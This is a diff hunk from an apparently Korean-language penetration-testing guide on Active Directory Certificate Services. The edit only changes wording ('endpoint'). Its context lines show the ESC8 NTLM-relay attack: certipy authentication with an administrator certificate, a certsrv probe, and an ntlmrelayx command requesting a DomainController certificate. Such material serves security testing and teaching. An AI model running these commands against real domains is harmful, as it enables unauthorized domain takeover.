@@ -206,13 +206,13 @@ certipy auth -pfx administrator.pfx -dc-ip DC_IP
 
 ## ESC8: NTLM Relay to ADCS HTTP Enrollment
 
-ADCS의 HTTP enrollment 엔드포인트(certsrv)가 NTLM 인증을 사용하는 경우, NTLM relay를 통해 인증서를 요청할 수 있다.
+ADCS의 HTTP enrollment endpoint(certsrv)가 NTLM 인증을 사용하는 경우, NTLM relay를 통해 인증서를 요청할 수 있다.
 
 ```bash
-# Step 1: Web Enrollment 엔드포인트 확인
+# Step 1: Web Enrollment endpoint 확인
 curl -s http://CA_IP/certsrv/ -I
 
-# Step 2: ntlmrelayx로 ADCS HTTP 엔드포인트에 relay
+# Step 2: ntlmrelayx로 ADCS HTTP endpoint에 relay
 impacket-ntlmrelayx -t http://CA_IP/certsrv/certfnsh.asp -smb2support \
   --adcs --template DomainController
 
